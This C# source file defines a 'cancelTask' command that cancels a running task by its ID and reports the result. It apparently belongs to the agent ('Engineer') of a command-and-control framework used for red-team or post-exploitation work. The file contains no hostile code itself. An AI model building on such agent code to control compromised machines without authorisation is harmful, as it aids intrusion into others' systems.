using System.Threading;
using System.Threading.Tasks;
using DynamicEngLoading;
using Engineer.Functions;


namespace Engineer.Commands
{
    internal class CancelTask : EngineerCommand
    {
        public override string Name => "cancelTask";

        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/TaskId", out string canceltaskId);
            // Find the task and cancel its CancellationToken
            var taskToCancel = Tasking.engTaskDic[canceltaskId];

            // Find the CancellationTokenSource for the task and cancel it
            if (Tasking.cancellationTokenSourceDic.TryGetValue(canceltaskId, out CancellationTokenSource cts))
            {
                cts.Cancel();
            }
            else
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Failed to find CancellationTokenSource for task {canceltaskId}", task, EngTaskStatus.Failed, TaskResponseType.String);
                return;
            }

            // Call FillTaskResult saying we cancelled the task
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Cancelled task {canceltaskId}", task, EngTaskStatus.Complete, TaskResponseType.String);
        }
    }
}
